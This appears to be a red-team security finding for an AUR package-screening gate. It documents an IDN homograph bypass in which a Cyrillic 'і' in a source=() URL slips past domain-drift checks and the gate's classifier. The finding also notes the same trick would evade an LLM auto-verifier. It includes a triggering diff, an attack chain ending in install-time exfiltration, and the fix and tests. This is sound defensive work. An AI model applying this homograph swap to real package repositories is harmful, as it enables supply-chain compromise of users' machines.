# Finding E — IDN homograph `source=()` URL bypass → silent exit 0

**Source:** glm-5.1 red-team review, session `019f0517-d737-732f-b8d6-6ae4c3208309`  
**Status:** mitigated (review-level, 2026-07-01)
**Severity:** critical  
**Lines:** `source_domains()` at aur-safe:257-266, `_source_line_nonascii()` at aur-safe:268-285, `classify_diff_rules()` ~aur-safe:1052-1060, `_boring_added_line_class()` at aur-safe:313

## What happens

A homograph `source=()` URL swap (the exact example from the threat model —
`іnstall.example-clі.dev` with Cyrillic `і` U+0456) bypasses both domain-drift
detection AND the boring classifier, producing a silent exit 0.

**Code path:**

1. `source_domains()` line 232-236 — awk prints the `source=(...)` block, then
   `grep -aoE '://[a-zA-Z0-9._-]+'` extracts the hostname. The character class
   is **strict ASCII**. A hostname starting with non-ASCII produces zero extracted
   chars → `new_s=""`.

2. `classify_diff_rules()` line 795-803 — `if [[ -n "$new_s" ]]` is false on an
   empty result → domain drift check **skipped entirely**.

3. `_boring_added_line_class()` line 273 —
   `'^[[:space:]]*source=\(.*\)[[:space:]]*$'` matches the single-line
   `source=('https://іnstall.example-clі.dev/...')` → returns **0 (boring)**.

4. `scan_diff_rules()` line 867-906 — `boring` → return 0 → caller stages X →
   user is told `ok`.

**Triggering diff:**
```diff
-source=('https://install.example-cli.dev/foo-1.0.tar.gz')
+source=('https://іnstall.example-clі.dev/foo-2.0.tar.gz')
```

(`і` = U+0456 both before the `n` and in `clіdev`. Single-quoted single-line
form — the default makepkg style.)

**Note on multi-line mitigation:** If the attacker uses multi-line `source=()`,
the homograph URL sits on a continuation line (not the `source=` token-start
line). The guard's original shape anchored on `^source...=`, so it missed the
continuation; the URL then hit the standalone-URL `boring_edge` path → reachable
by the LLM auto-green verifier. `boring_edge` is *not* a silent exit 0, but the
LLM is no more able to spot an invisible Cyrillic byte than the deterministic
classifier — same threat class as the finding being closed. **Fixed
2026-07-05:** the guard now matches any `+`-line carrying `://` with a byte
≥ 0x80, not just `source=` token-start lines. See the `_source_line_nonascii`
comment for the two matched shapes. Only the single-line form was ever a silent
exit 0; the multi-line form is now review like the rest.

## Exploitability

**High.** Attacker maintains AUR package P with prior clean baseline. Pushes
commit X with homograph URL on single-line `source=(...)` + matching
`pkgver`/`pkgrel` literal bumps (those also auto-classify as boring). `makepkg`
resolves the homograph domain (different DNS) → fetches malicious archive →
`prepare()`/`build()` runs attacker shell at install time → exfiltration. Gate
prints `ok`, exit 0 — no consent, no explanation. Stage X → next gate diffs
malicious X..origin/master → silent onward.

## Fix

Implemented 2026-07-01 (option 3 below, review-level). Triggered by false-
positive reviews on `opencode-bin` / `visual-studio-code-bin`: closing the
`.SRCINFO source_<arch> =` classifier gap would have re-opened this finding,
so the guard was added in the same change.

`_source_line_nonascii()` echoes any added line carrying a non-ASCII byte
(≥ 0x80; LC_ALL=C `grep -E '[^[:print:][:space:]]'`, which flags multibyte
UTF-8) on either (a) a `source` / `source_*=` token-start line, or (b) any
line containing `://` — the URL scheme separator. `classify_diff_rules` calls
it immediately after the `source-domain-new` drift check and before the
per-line boring loop, setting `review_hits=1` → review, not silent exit 0.
Shape (a) covers every source-token syntax: `.SRCINFO` space-delimited
(`source =` / `source_x86_64 =`), PKGBUILD single-line arrays
(`source=(...)`, `source_x86_64=(...)`), and bare assignments. Shape (b)
catches the multi-line array continuation line (the URL sits on its own line,
not the `source=` opener) — added 2026-07-05 after a delegate review flagged
that the continuation line otherwise falls to the standalone-URL `boring_edge`
path, reachable by the LLM auto-green verifier. Review-level (not hard-block)
per the finding doc's "review-level homograph check" recommendation and the
`source-domain-new` precedent — defense-in-depth, the human decides.

Other options considered / still open:
- Add a hard RULE matching non-ASCII chars in any `source=` / `source_*=()` line
  (cheap, no FP risk: ASCII-only is the de facto standard). Stronger than
  review; deferred — review already stops the silent bypass.
- Extend `source_domains` regex to include multi-byte hosts
  (e.g. `://[^/"'\x20]+` then punycode-normalize for set-diff); ASCII host vs
  Cyrillic host WILL register as drift. Not done — the non-ASCII guard makes
  this redundant for the silent-bypass case.

## Test gap

Closed 2026-07-01 (single-line forms) and 2026-07-05 (multi-line form). Four
selftest fixtures pin the guard:
`srcinfo-arch-source-homograph-review` (`.SRCINFO source_x86_64 =` + Cyrillic),
`pkgbuild-source-homograph-review` (PKGBUILD single-line array + Cyrillic),
`srcinfo-source-homograph-review` (bare `.SRCINFO source =` + Cyrillic), and
`pkgbuild-multiline-source-homograph-review` (multi-line `source=(\n  <url>\n)`
+ Cyrillic on the continuation line). All expect `review`/rc2.
